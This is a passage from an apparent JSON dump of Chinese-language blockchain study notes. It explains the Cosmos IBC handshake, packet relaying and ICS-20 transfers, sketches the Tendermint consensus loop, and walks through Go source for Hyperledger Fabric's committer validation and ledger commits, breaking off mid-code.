示意图如下：\n\nconnection\n两条链之间的连接状态转换都是由Relayer完成的.\n阶段1：connOpenInit\nINIT状态的新连接被创建并存储在启动区块链上\n阶段2：connOpenTry\n如果已验证INIT状态的连接是在发起链上创建的，relyer则会创建TRYOPEN状态的新连接并将其存储在相反的区块链上。\n阶段3：connOpenAck\n如果src链已验证TRYOPEN状态的连接是在dst链上创建的，则src链上的连接状态将从INIT更新为OPEN\n阶段4：connOpenConfirm\n如果验证了发起链上的连接状态从INIT转换为OPEN，则在相反链上，连接状态将从TRYOPEN更新为OPEN\n\nchannel\n通道和连接绑定，用来传输跨链数据包，通道的状态转换也是跟connection一样的，IBC会根据channel+port声明其跨链能力，比如某个APP模块具备跨链能力。和不同的链进行跨链则会创建不同的channel，不同的跨链APP则会声明不同的能力，这种设计保证了跨链的安全和稳定。\npacket\npacket 代表着用户从应用层发出跨链交易，通过IBC模块转换成packet，Relayer订阅事件扫到相关sendpacket事件后，会构建msgRecvPacket在dst链进行处理。其生命周期如下：\n\n正常流程：\n用户通过APP A 发送跨链包给ibc模块，relayer 查询跨链包并生成msgRecvPacket,在链B调用，通过IBC B的OnRecvPacket回调App B，APP B 返回ACK 给Relayer,Relayer生成AckPacket在链A调用，IBC A通过 onAcknowLedgePacket 回调APP A处理ACK，比如转账，失败的ACK会从取消托管账户的资金。\n超时流程：\n用户通过APP A 发送跨链包给ibc模块，relayer 查询跨链包并生成msgRecvPacket,Relayer查询相关包receipt，如果在规定的timeout时间内没有，则构造timeoutPacket发往src链，src会根据此消息做出超时处理。\n整体过程\nuser 基于IBC/APP 发送跨链交易，IBC/TAO将其转换成packet，并记录在相关存储中。\nrelayer 通过事件监听，将IbcmessageEvent读取到,这里是EventTypeSendPacket， 他都会转换成msg,扔到缓存里，然后根据配置的路径合并消息并进行相应的处理\n接着realyer准备中继packets\n\n\nrelayer对 packet 进行基础校验\n\n\nRelayer向src链查询packect commitment(packet proof，proof包括root hash, proof path,以及要验证的key值) 以及对应高度\n\n\n然后准备一个msgrecvPackect 在 dst 上带调用 (附带了src packet 的包的存在性证明)\nmsg := &amp;chantypes.MsgRecvPacket{\n\t\tPacket:          msgTransfer.Packet(),\n\t\tProofCommitment: proof.Proof,\n\t\tProofHeight:     proof.ProofHeight,\n\t\tSigner:          signer,\n\t}\n\n\n准备升级dst链上src的客户端的消息到最新（也是为了轻客户端验证）（实际是从src链查询的，有可能作恶，但是会被dst上面的更新客户端逻辑验证），relayer是获取了src最新的header，以及保存在dst上最新的header，分别进行验证，保存的验证直接通过store,src最新的header验证。\n\n\n将消息发到对应链的池子中\n\n\n接着dst上的链该要执行msgrecvPacket了\n\n第一步是IBC/TAO层的验证，dst链必须有能力处理这个包，同时确保包不是乱发的，且和对手链之间已经建立了连接和通道，并且从未接受过这个packet，最重要的一点是要证明src的确有这个packet信息，最后需要设置已经接收了这个packet的receipt\nibc 执行回调函数OnRecvPacket（app注册的实际接收packet的处理），执行成功与否会返回ack,代表了相关信息\ndst链设置ack ,为了在src链上的dst客户端可以验证\n\n接着又是relyer登场，他会监听write_acknowledgement 事件进行处理\n\n查询dst链上ack的proof，确认在dst链上发生\n构造MsgAcknowledgement消息\nrelayer把dst最新的客户端状态更新到src上\nsrc链对ack包进行验证(是否是dst链发过来的)， 删除数据包承诺，由于数据包已被确认，因此不再需要该承诺\n\n到此整个跨链过程结束。\n存在性证明\n在跨链交互中，涉及到了多个类型的消息， 比如channel，connection，packet等消息，Relayer在传递消息的过程中，也要将消息对应的存在性证明带给对手链，这样对手链可以根据源连的轻客户端以及证明来验证消息的正确性。其主要原理是基于IVAL+ tree的proof验证以及proof生成。\nIAVL+树是一种有序键的树结构，其中每个节点都代表一个键值对，节点内部存储键的值以及子树的元数据。IAVL+树的每个节点都有一个哈希值，这个哈希值是通过节点的键值、子树哈希值和节点元数据计算得出的。\n现在假设我们要验证某个键K是否存在于IAVL+树中。我们可以通过树的根哈希值（roothash）和键K来计算出一个证明路径，这个证明路径包含了树中所有涉及到K的节点，包括K所在的叶子节点和所有的祖先节点。具体步骤如下：\n\n从根节点开始，将K与当前节点存储的键进行比较。\n如果K等于当前节点存储的键，则停止搜索，返回证明路径。如果K小于当前节点存储的键，则进入当前节点的左子树继续搜索；如果K大于当前节点存储的键，则进入当前节点的右子树继续搜索。\n在搜索过程中，每个节点都将其子树哈希值加入到证明路径中。\n当搜索到K所在的叶子节点时，将叶子节点的哈希值也加入到证明路径中。\n最终，证明路径中包含了树中所有涉及到K的节点的哈希值。\n\n通过证明路径，我们可以验证K是否存在于IAVL+树中。具体的验证步骤如下：\n\n从根哈希值开始，计算每个涉及到K的节点的哈希值，直到计算出K所在的叶子节点的哈希值。\n将证明路径中所有节点的哈希值按照它们在树中的位置排序，并将它们合并成一个单一的哈希值。\n将这个合并后的哈希值与根哈希值进行比较。如果两个哈希值相等，则K存在于树中；否则，K不存在于树中。\n\n跨链转账举例\n参考自ICS-20 ，支持跨链传输token，以从A链到B链为例：\ntransfer from A to B ：\n\nChainA以原子方式执行以下操作：\n\n\n\n锁定ICS-20模块中的令牌\n\n\n然后对指定锁定代币数量和面额的数据包执行sendPacket操作\n\n\n\nChainB以原子方式执行以下操作：\n\n\n\n对数据包执行recvPacket操作\n\n\n然后铸造等同于ICS-20模块中锁定代币的代金券代币\n\n\n\nChainA正常执行acknowledgePacket。\n\n\n\nback from B to A:\n\nChainB以原子方式执行以下操作：\n\n\n在ICS-20模块中焚烧代金券代币\n然后对指定烧毁凭证金额和面额的数据包执行sendPacket操作\n\n\nChainA以原子方式执行以下操作：\n\n\n\n对数据包执行recvPacket操作\n\n\n然后解锁相当于ICS-20模块中烧毁的代金券的代币\n\n\n\nChainB正常执行acknowledgePacket。\n\n\n​\t整体还是基于 lock+mint+ 托管+轻客户端验证模型，算是比较稳妥的技术方案。\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/interchain-accounts":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/interchain-accounts","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/interchain-accounts.md","title":"interchain-accounts","links":[],"tags":[],"content":"medium.com/chainapsis/why-interchain-accounts-change-everything-for-cosmos-interoperability-59c19032bf11\ndemo\ngithub.com/cosmos/interchain-accounts-demo"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/tendermint/tendermint源码架构":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/tendermint/tendermint源码架构","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/tendermint/tendermint源码架构.md","title":"tendermint源码架构","links":[],"tags":[],"content":"consensus\nOnStart → timeoutRoutine start  超时处理\n​\t\t\t→ go cs.receiveRoutine(0) 开启接收协程\ncs.receiveRoutine\nfor {\n\t\tselect {\n\t\tcase &lt;-cs.txNotifier.TxsAvailable():\n\t\t\tcs.handleTxsAvailable()\n \n\t\tcase mi = &lt;-cs.peerMsgQueue:\n\t\t\tif err := cs.wal.Write(mi); err != nil {\n\t\t\t\tcs.Logger.Error(&quot;failed writing to WAL&quot;, &quot;err&quot;, err)\n\t\t\t}\n \n\t\t\t// handles proposals, block parts, votes\n\t\t\t// may generate internal events (votes, complete proposals, 2/3 majorities)\n\t\t\tcs.handleMsg(mi)\n \n\t\tcase mi = &lt;-cs.internalMsgQueue:\n\t\t\terr := cs.wal.WriteSync(mi) // NOTE: fsync\n\t\t\tif err != nil {\n\t\t\t\tpanic(fmt.Sprintf(\n\t\t\t\t\t&quot;failed to write %v msg to consensus WAL due to %v; check your file system and restart the node&quot;,\n\t\t\t\t\tmi, err,\n\t\t\t\t))\n\t\t\t}\n\t\t...\n\t\t\t// handles proposals, block parts, votes\n\t\t\tcs.handleMsg(mi)\n \n\t\tcase ti := &lt;-cs.timeoutTicker.Chan(): // tockChan:\n\t\t\tif err := cs.wal.Write(ti); err != nil {\n\t\t\t\tcs.Logger.Error(&quot;failed writing to WAL&quot;, &quot;err&quot;, err)\n\t\t\t}\n \n\t\t\t// if the timeout is relevant to the rs\n\t\t\t// go to the next step\n\t\t\tcs.handleTimeout(ti, rs)\n\t}\n}\n一共做3件事：\n\n处理外部接收的消息\n处理内部接收的消息\n处理超时消息\n\n共识流程\n(谁，在什么时候做) createProposalBlock -&gt;\n \n​\t\t\t\t\t\t\t\t-&gt; （从交易池中获取交易） blockExec.mempool.ReapMaxBytesMaxGas(maxDataBytes, maxGas)\n \n​\t\t\t\t\t\t\t\t-&gt; 组装区块（构建基本区块，使用状态数据填充）\n \n \n \ncreateProposalBlock -&gt; NewProposal(根据上面区块以及高度round)-&gt;SignProposal-&gt; SetProposalAndBlock (ProposalMessage和BlockPartMessage （如何处理）)-&gt;signVote(对区块投票,塞入VoteMessage消息)-&gt;\t\n编程技巧\n\n\n对于一个通知通道，为什么还要用接口封装\ntype txNotifier interface {\n\tTxsAvailable() &lt;-chan struct{}\n}\n \n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Committer记账节点-8":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Committer记账节点-8","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger fabric源码_Committer记账节点-8.md","title":"死磕hyperledger fabric源码_Committer记账节点-8","links":[],"tags":[],"content":"\n死磕hyperledger fabric源码|Committer记账节点\n文章及代码：github.com/blockchainGuide/\n分支：v1.1.0\n\n\n概述\nCommitter记账节点功能模块的设计与实现的源代码主要分布在下表：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n源码目录文件功能阐述corecommitterTxvalidator交易验证器功能模块committer.go账本提交器接口定义committer_impl.go账本提交器实现ledgerkvledgekvLedger账本功能模块ledgerstorage账本数据存储对象模块pvtdatastorage隐私数据存储对象模块ledgermgmt账本管理模块customtx配置交易处理器模块commonledgerblockstorage区块存储模块protosCommonledgerprotobuf消息定义模块\n接下来将会围绕着这部分的内容进行分析。\n创建Committer功能模块\nPeer节点通过请求调用CSCC系统链码加入应用通道，执行joinChain()→peer.Create- ChainFromBlock()→createChain()函数，基于应用通道创世区块创建通道的链结构对象，用于管理账本、通道配置等资源，以正常接收通道的账本区块。\n接着，创建了交易验证器，并封装了vsccValidatorImpl结构对象用于支持调用VSCC链码。\n然后，创建账本提交器，并定义回调函数eventer，用于提交账本后自动更新链结构上的最新配置区块对象。\n现在进入到createChain里面分析：\nfunc createChain(cid string, ledger ledger.PeerLedger, cb *common.Block) error {\n...\n  vcs := struct { // 构造新的验证链码支持对象\n\t\t*chainSupport\n\t\t*semaphore.Weighted\n\t\tSupport\n\t}{cs, validationWorkersSemaphore, GetSupport()}\n\tvalidator := txvalidator.NewTxValidator(vcs) // 创建交易验证器\n\t// 创建账本提交器\n\tc := committer.NewLedgerCommitterReactive(ledger, func(block *common.Block) error {\n\t\tchainID, err := utils.GetChainIDFromBlock(block)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\treturn SetCurrConfigBlock(block, chainID)\n\t})\n...\n\t// 创建transient隐私数据存储对象\n\tstore, err := transientStoreFactory.OpenStore(bundle.ConfigtxValidator().ChainID())\n\t...\n\t// 初始化指定通道上的Gossip消息模块。\n\t// 若是主节点，则从Orderer服务节点获取区块数据。否则，从组织内其他节点同步数据\n\tservice.GetGossipService().InitializeChannel(bundle.ConfigtxValidator().ChainID(), ordererAddresses, service.Support{\n\t\tValidator: validator,\n\t\tCommitter: c,\n\t\tStore:     store,\n\t\tCs:        simpleCollectionStore,\n\t})\n \n\tchains.Lock()\n\tdefer chains.Unlock()\n\t// 构造新的链结构并插入Peer节点链结构\n\tchains.list[cid] = &amp;chain{\n\t\tcs:        cs, // 链支持对象\n\t\tcb:        cb, // 配置区块\n\t\tcommitter: c,  // 账本提交器\n\t}\n \n}\n验证交易数据的合法性\n验证交易入口：core/committer/txvalidator/validator.go/validateTx(),主要做了以下几件事\n①：解析获取交易数据的Envelope结构对象\nif env, err := utils.GetEnvelopeFromBlock(d); err != nil {}\n②：检查交易格式是否正确、签名是否合法、交易内容是否被篡改\nif payload, txResult = validation.ValidateTransaction(env, v.support.Capabilities()); txResult != peer.TxValidationCode_VALID {\n\t\t\tlogger.Errorf(&quot;Invalid transaction with index %d&quot;, tIdx)\n\t\t\tresults &lt;- &amp;blockValidationResult{\n\t\t\t\ttIdx:           tIdx,\n\t\t\t\tvalidationCode: txResult,\n\t\t\t}\n\t\t\treturn\n\t\t}\n③：解析获取通道头部\nchdr, err := utils.UnmarshalChannelHeader(payload.Header.ChannelHeader)\n④：检查通道链结构是否存在\nchannel := chdr.ChannelId\nif !v.chainExists(channel) {}\n⑤：根据Header的类型来分别处理消息\n5.1 普通交易消息\n先从账本获取指定交易的ID数据，检查是否存在，然后获取交易读写集，并检查写集的合法性，调用VSCC验证交易背书策略，接着获取交易链码实例，并设置调用链码实例\ntxID = chdr.TxId\n// 从账本获取指定交易的ID数据，检查是否存在\nif _, err := v.support.Ledger().GetTransactionByID(txID); err == nil {\n  ...\n}\n// 获取交易读写集，并检查写集的合法性，调用VSCC验证交易背书策略\nerr, cde := v.vscc.VSCCValidateTx(payload, d, env)\ni..\n// 获取交易链码实例\ninvokeCC, upgradeCC, err := v.getTxCCInstance(payload)\n...\n// 设置调用链码实例\ntxsChaincodeName = invokeCC\n5.2 通道配置交易消息\n先解析获取配置交易对象，然后更新通道配置。\n// 通道配置交易消息，解析获取配置交易对象\nconfigEnvelope, err := configtx.UnmarshalConfigEnvelope(payload.Data)\n...\n// 更新通道配置\nif err := v.support.Apply(configEnvelope); err != nil {\n ...\n}\n5.3 如果是Peer资源更新消息，直接构造blockValidationResult返回\n⑥：序列化封装交易Envelope结构对象\nif _, err := proto.Marshal(env); err != nil {\n\t\t\tlogger.Warningf(&quot;Cannot marshal transaction: %s&quot;, err)\n\t\t\tresults &lt;- &amp;blockValidationResult{\n\t\t\t\ttIdx:           tIdx,\n\t\t\t\tvalidationCode: peer.TxValidationCode_MARSHAL_TX_ERROR,\n\t\t\t}\n\t\t\treturn\n\t\t}\n⑦：最后通过了交易，基于上述参数构造区块验证结果对象\nresults &lt;- &amp;blockValidationResult{\n\t\t\ttIdx:                 tIdx,\n\t\t\ttxsChaincodeName:     txsChaincodeName,\n\t\t\ttxsUpgradedChaincode: txsUpgradedChaincode,\n\t\t\tvalidationCode:       peer.TxValidationCode_VALID,\n\t\t\ttxid:                 txID,\n\t\t}\n\t\treturn\n账本提交器\n账本提交器的LedgerCommitter.CommitWithPvtData()方法负责执行具体的账本提交工作。该方法首先调用LedgerCommitter对象的lc.preCommit(blockAndPvtData.Block)方法，预处理待提交的区块数据，对于配置区块执行自定义lc.eventer(block)回调函数，即从当前区块中解析出链ID，再调用SetCurrConfigBlock()函数，从本地链结构字典中获取关联的链结构chains.list[cid]并更新其最新的配置区块。接着，调用lc.PeerLedger.CommitWithPvtData(blockAndPvtData)→kvLedger.CommitWithPvtData()方法提交数据到账本中，这是账本提交器的核心工作方法。当成功提交账本后，调用lc.postCommit(blockAndPvtData.Block)方法，基于该区块创建区块事件与过滤区块事件，并执行producer.Send()方法将两个事件发送到事件服务器，通知订阅客户端有新区块到达。\n进入到CommitWithPvtData()方法中：\nfunc (l *kvLedger) CommitWithPvtData(pvtdataAndBlock *ledger.BlockAndPvtData) error {\n\tvar err error\n\tblock := pvtdataAndBlock.Block                 // 获取区块对象\n\tblockNo := pvtdataAndBlock.Block.Header.Number // 获取区块号\n\t// 验证并准备区块和隐私数据对象\n\terr = l.txtmgmt.ValidateAndPrepare(pvtdataAndBlock, true)\n\t...\n\t//提交区块和隐私数据到账本中\n\tif err = l.blockStore.CommitWithPvtData(pvtdataAndBlock); err != nil {\n\t\treturn err\n\t}\n\t...\t\n\tif err = l.txtmgmt.Commit(); err != nil { // 更新有效交易数据到状态数据库\n\t\tpanic(fmt.Errorf(`Error during commit to txmgr:%s`, err))\n\t}\n\tif ledgerconfig.IsHistoryDBEnabled() {\n\t\tlogger.Debugf(&quot;Channel [%s]: Committing block [%d] transactions to history database&quot;, l.ledgerID, blockNo)\n\t\tif err := l.historyDB.Commit(block); err != nil { // 更新区块数据到历史数据库\n\t\t\tpanic(fmt.Errorf(`Error during commit to history db:%s`, err))\n\t\t}\n\t}\n\treturn nil\n}\n此函数主要也就做了以下比较关键的事情：\n\nValidateAndPrepare:验证并准备区块和隐私数据对象\nCommitWithPvtData:提交区块和隐私数据到账本中\ntxtmgmt.Commit():更新有效交易数据到状态数据库\nl.historyDB.Commit(block):更新区块数据到历史数据库\n\n接下来将分别介绍这些功能的细节。\n验证并准备区块和隐私数据对象\n函数调用：\n\nerr = l.txtmgmt.ValidateAndPrepare(pvtdataAndBlock, true)\n→ batch, err := txmgr.validator.ValidateAndPrepareBatch(blockAndPvtdata, doMVCCValidation)\n\nfunc validateAndPreparePvtBatch(block *valinternal.Block, pvtdata map[uint64]*ledger.TxPvtData) (*privacyenabledstate.PvtUpdateBatch, error) {\n\tpvtUpdates := privacyenabledstate.NewPvtUpdateBatch()\n\tfor _, tx := range block.Txs {\n\t\tif tx.ValidationCode != peer.TxValidationCode_VALID {\n\t\t\tcontinue\n\t\t}\n\t\tif !tx.ContainsPvtWrites() {\n\t\t\tcontinue\n\t\t}\n\t\ttxPvtdata := pvtdata[uint64(tx.IndexInBlock)] // 获取指定交易的隐私数据\n\t\tif txPvtdata == nil {                         // 跳过没有隐私数据的交易\n\t\t\tcontinue\n\t\t}\n\t\t// 检查是否需要验证隐私数据，默认都返回true\n\t\tif requiresPvtdataValidation(txPvtdata) {\n\t\t\t// 验证隐私数据哈希值是否匹配\n\t\t\tif err := validatePvtdata(tx, txPvtdata); err != nil {\n\t\t\t\treturn nil, err\n\t\t\t}\n\t\t}\n\t\tvar pvtRWSet *rwsetutil.TxPvtRwSet\n\t\tvar err error\n\t\t// 解析隐私数据写集合\n\t\tif pvtRWSet, err = rwsetutil.TxPvtRwSetFromProtoMsg(txPvtdata.WriteSet); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\t// 添加到隐私数据更新批量操作\n\t\taddPvtRWSetToPvtUpdateBatch(pvtRWSet, pvtUpdates, version.NewHeight(block.Num, uint64(tx.IndexInBlock)))\n\t}\n\treturn pvtUpdates, nil\n}\n首先遍历当前内部区块的交易列表block.Txs，对于其中的每个交易对象tx，需要过滤掉如下三类交易。\n\n交易验证码不为TxValidationCode_VALID的无效交易\n不存在隐私数据写数据哈希值的交易\n无隐私数据的交易\n\n如果交易通过了上述检查，则对于合法有效的交易tx及其隐私数据txPvtdata（TxPvt-Data类型），调用validatePvtdata(tx，txPvtdata)方法，以验证隐私数据哈希值的正确性，因为隐私数据都是由Endorser背书节点生成的，需要检查传播后的数据是否被篡改过。大致的过程如下：\nfunc validatePvtdata(tx *valinternal.Transaction, pvtdata *ledger.TxPvtData) error {\n\t...\n\tfor _, nsPvtdata := range pvtdata.WriteSet.NsPvtRwset {\n\t\tfor _, collPvtdata := range nsPvtdata.CollectionPvtRwset {\n\t\t\t// 基于原始数据计算隐私数据哈希值\n\t\t\tcollPvtdataHash := util.ComputeHash(collPvtdata.Rwset)\n\t\t\t// 获取 交易中的数据哈希值\n\t\t\thashInPubdata := tx.RetrieveHash(nsPvtdata.Namespace, collPvtdata.CollectionName)\n\t\t\t// 比较隐私数据哈希值\n\t\t\tif !bytes.Equal(collPvtdataHash, hashInPubdata) {\n\t\t\t\t...\n\t\t}\n\t}\n\treturn nil\n}\n提交区块和隐私数据到账本中\n函数调用：l.blockStore.CommitWithPvtData(pvtdataAndBlock)\n\ncore/ledger/ledgerstorage/store.go/CommitWithPvtData\n\nfunc (s *Store) CommitWithPvtData(blockAndPvtdata *ledger.BlockAndPvtData) error {\n\t...\n\tfor _, v := range blockAndPvtdata.BlockPvtData {\n\t\t// 添加隐私数据到隐私数据列表pvtdata\n\t\tpvtdata = append(pvtdata, v)\n\t}\n\t// 准备将隐私数据列表pvtdata提交到账本中，先提交再确认\n\tif err := s.pvtdataStore.Prepare(blockAndPvtdata.Block.Header.Number, pvtdata); err != nil {\n\t\treturn err\n\t}\n\t// 提交区块到账本中\n\tif err := s.AddBlock(blockAndPvtdata.Block); err != nil {\n\t\ts.pvtdataStore.Rollback()\n\t\treturn err\n\t}\n\t// 确认提交隐私数据\n\treturn s.pvtdataStore.Commit()\n}\n大概就做了以下几件事：\n\n准备提交隐私数据：Prepare\n提交区块数据：s.AddBlock\n确认提交隐私数据：s.pvtdataStore.Commit()\n\n①：准备提交隐私数据\n通过隐私数据存储对象调用s.pvtdataStore.Prepare()→store.Prepare()方法，将pvtdata列表中的每个隐私数据对象重新编码并构成KV键值对，添加到账本上隐私数据库的更新批量操作中，并同步更新到数据库中。最后，等待区块数据提交操作确认后，根据提交结果状态确认提交或回滚恢复隐私数据。\nfunc (s *store) Prepare(blockNum uint64, pvtData []*ledger.TxPvtData) error {\n\t// 检查合法性，执行Prepare()时应该是false，因为Commit和Rollback操作会重置该标志位\n\tif s.batchPending {\n\t\treturn &amp;ErrIllegalCall{`A pending batch exists as as result of last invoke to &quot;Prepare&quot; call.\n\t\t\t Invoke &quot;Commit&quot; or &quot;Rollback&quot; on the pending batch before invoking &quot;Prepare&quot; function`}\n\t}\n\t// 获取下一个区块号\n\texpectedBlockNum := s.nextBlockNum()\n\t// 检查区块号的合法性\n\tif expectedBlockNum != blockNum {\n\t\treturn &amp;ErrIllegalArgs{fmt.Sprintf(&quot;Expected block number=%d, recived block number=%d&quot;, expectedBlockNum, blockNum)}\n\t}\n\t// 创建数据库更新操作集合batch，记录所有需要删除或增加数据的key键\n\tbatch := leveldbhelper.NewUpdateBatch()\n\tvar key, value []byte\n\tvar err error\n\t// 遍历隐私数据列表，构造该隐私数据KV键值对\n\tfor _, txPvtData := range pvtData {\n\t\t// 遍历隐私数据列表，构造该隐私数据KV键值对\n\t\tkey = encodePK(blockNum, txPvtData.SeqInBlock)\n\t\tif value, err = encodePvtRwSet(txPvtData.WriteSet); err != nil {\n\t\t\t// 构造value值：隐私数据写集合\n\t\t\treturn err\n\t\t}\n\t\tlogger.Debugf(&quot;Adding private data to LevelDB batch for block [%d], tran [%d]&quot;, blockNum, txPvtData.SeqInBlock)\n\t\t// 添加隐私数据键值对的操作\n\t\tbatch.Put(key, value)\n\t}\n\t// 添加pendingCommitKey键值对的操作\n\tbatch.Put(pendingCommitKey, emptyValue)\n\t// 同步执行数据库的更新操作集合\n\tif err := s.db.WriteBatch(batch, true); err != nil {\n\t\treturn err\n\t}\n\t// 更新状态标志位\n\ts.batchPending = true\n\tlogger.Debugf(&quot;Saved %d private data write sets for block [%d]&quot;, len(pvtData), blockNum)\n\treturn nil\n}\n②：提交区块数据\n调用s.AddBlock(blockAndPvtdata.Block)方法，实际上是通过区块文件管理器，调用blockfileMgr.addBlock()方法，提交新区块blockAndPvt-data.Block到区块数据文件中，并保存新的区块检查点信息newCPInfo。接着，调用indexBlock()方法，建立当前区块的索引信息与索引检查点信息（当前区块号等），更新到区块索引数据库中。然后，调用mgr.updateCheckpoint(newCPInfo)方法，更新区块文件管理器上的区块检查点信息，再执行mgr.cpInfoCond.Broadcast()方法，广播唤醒所有等待该同步条件变量的程序，通知已有新区块提交到账本中。最后，调用mgr.updateBlockchain-Info()方法，更新区块链信息，如最新区块高度、最新区块头哈希值等。\n③：确认提交隐私数据\n调用 s.pvtdataStore.Commit()方法，执行隐私数据的提交确认操作。由于前面的Prepare()方法已经更新了所有的隐私数据键值对到数据库中，因此，该方法实际上是在隐私数据库上删除pendingCommitKey键值对，并添加lastCommittedBlkkey键值对，以保存最近提交成功的区块号committingBlockNum。最后，更新隐私数据相关标志位与变量，将等待提交确认标志位batchPending与标志位isEmpty设置为false，将lastCommitted-Block更新为提交账本的区块号committingBlockNum。\n如果提交区块数据失败，则CommitWithPvtData()将通过隐私数据存储对象调用s.pvt-dataStore.Rollback()方法执行回滚操作，将已提交的隐私数据恢复到提交数据库之前的状态。\n提交数据到状态数据库\n入口：core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/lockbased_txmgr.go/ Commit()\nfunc (txmgr *LockBasedTxMgr) Commit() error {\n\t...\n\tif err := txmgr.db.ApplyPrivacyAwareUpdates(txmgr.batch,\n\t\tversion.NewHeight(txmgr.currentBlock.Header.Number, uint64(len(txmgr.currentBlock.Data.Data)-1)))\n\t\t...\n\t}\n}\nfunc (s *CommonStorageDB) ApplyPrivacyAwareUpdates(updates *UpdateBatch, height *version.Height) error {\n\taddPvtUpdates(updates.PubUpdates, updates.PvtUpdates)\n\taddHashedUpdates(updates.PubUpdates, updates.HashUpdates, !s.BytesKeySuppoted())\n\treturn s.VersionedDB.ApplyUpdates(updates.PubUpdates.UpdateBatch, height)\n}\n最终会进入到下面的函数中：\n\ncore/ledger/kvledger/txmgmt/statedb/stateleveldb/stateleveldb.go\n\nfunc (vdb *versionedDB) ApplyUpdates(batch *statedb.UpdateBatch, height *version.Height) error {\n\tdbBatch := leveldbhelper.NewUpdateBatch()\n\tnamespaces := batch.GetUpdatedNamespaces()\n\tfor _, ns := range namespaces {\n\t\tupdates := batch.GetUpdates(ns)\n\t\tfor k, vv := range updates {\n\t\t\tcompositeKey := constructCompositeKey(ns, k)\n\t\t\tlogger.Debugf(&quot;Channel [%s]: Applying key(string)=[%s] key(bytes)=[%#v]&quot;, vdb.dbName, string(compositeKey), compositeKey)\n \n\t\t\tif vv.Value == nil {\n\t\t\t\tdbBatch.Delete(compositeKey)\n\t\t\t} else {\n\t\t\t\tdbBatch.Put(compositeKey, statedb.EncodeValue(vv.Value, vv.Version))\n\t\t\t}\n\t\t}\n\t}\n\tdbBatch.Put(savePointKey, height.ToBytes())\n\t// Setting snyc to true as a precaution, false may be an ok optimization after further testing.\n\tif err := vdb.db.WriteBatch(dbBatch, true); err != nil {\n\t\treturn err\n\t}\n\treturn nil\n}\nApplyUpdates()方法主要做了以下几件事：\n\n遍历更新批量操作，对于其包含的键值对（键k与值vv），调用constructCompositeKey(ns，k)方法重新构造组合键compositeKey\n检查该键值对操作的删除标识。如果vv.Value为nil，说明该键值对更新操作为删除操作，则继续调用dbBatch.Delete(compositeKey)方法，添加该删除操作到dbBatch对象中。否则，将vv.Version中的区块号与交易序号经过编码序列化成字节数组，并与vv.Value组合成编码值encodedValue，再将其写入操作添加到dbBatch对象中\n调用dbBatch.Put方法，添加保存点标识的KV键值对。其中，键为[]byte{0x00}，值为版本height经过编码序列化后的字节数组\n调用vdb.db.WriteBatch方法，以原子操作方式将dbBatch更新同步到状态数据库上。注意，在写入数据库时同样会重新构造KV键值对，在原来的键上添加数据库名称（链ID/账本ID）前缀，即[]byte(dbName)+[]byte{0x00}，以隔离不同通道上的状态数据。\n\n更新历史数据库\n调用l.historyDB.Commit(block)方法，以更新区块block中经过Endorser背书的有效交易数据到历史数据库中，代码如下：\n\ncore/ledger/kvledger/history/historydb/historyleveldb/historyleveldb.go\n\nfunc (historyDB *historyDB) Commit(block *common.Block) error {\n \n\tblockNo := block.Header.Number // 获取区块号\n\t//Set the starting tranNo to 0\n\tvar tranNo uint64\n...\n\t// Get the invalidation byte array for the block\n\t// 获取交易验证码列表\n\ttxsFilter := util.TxValidationFlags(block.Metadata.Metadata[common.BlockMetadataIndex_TRANSACTIONS_FILTER])\n\t// Initialize txsFilter if it does not yet exist (e.g. during testing, for genesis block, etc)\n\tif len(txsFilter) == 0 {\n\t\ttxsFilter = util.NewTxValidationFlags(len(block.Data.Data))\n\t\tblock.Metadata.Metadata[common.BlockMetadataIndex_TRANSACTIONS_FILTER] = txsFilter\n\t}\n \n\t// write each tran&#039;s write set to history db\n\tfor _, envBytes := range block.Data.Data { // 遍历区块所有交易数据\n\t\tif txsFilter.IsInvalid(int(tranNo)) { // 过滤掉无效交易\n\t\t\tlogger.Debugf(&quot;Channel [%s]: Skipping history write for invalid transaction number %d&quot;,\n\t\t\t\thistoryDB.dbName, tranNo)\n\t\t\ttranNo++\n\t\t\tcontinue\n\t\t}\n\t\t// 解析获取交易消息Envelope结构对象\n\t\tenv, err := putils.GetEnvelopeFromBlock(envBytes)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n \n\t...\n\t\t// 检查类型：经Endorser背书的普通交易消息\n\t\tif common.HeaderType(chdr.Type) == common.HeaderType_ENDORSER_TRANSACTION {\n \n\t\t\t// extract actions from the envelope message\n\t\t\t// 从交易消息中解析提取链码动作\n\t\t\trespPayload, err := putils.GetActionFromEnvelope(envBytes)\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n...\n\t\t\t// 解析交易读写集到TxReadWriteSet结构对象中\n\t\t\tif err = txRWSet.FromProtoBytes(respPayload.Results); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\t// 遍历所有读写集，重新构造KV键值对添加到历史数据库\n\t\t\tfor _, nsRWSet := range txRWSet.NsRwSets {\n\t\t\t\tns := nsRWSet.NameSpace\n \n\t\t\t\tfor _, kvWrite := range nsRWSet.KvRwSet.Writes {\n\t\t\t\t\twriteKey := kvWrite.Key\n \n\t\t\t\t\t// 构造组合键\n\t\t\t\t\tcompositeHistoryKey := historydb.ConstructCompositeHistoryKey(ns, writeKey, blockNo, tranNo)\n \n\t\t\t\t\t// 写入空的字节数组[]byte{}\n\t\t\t\t\tdbBatch.Put(compositeHistoryKey, 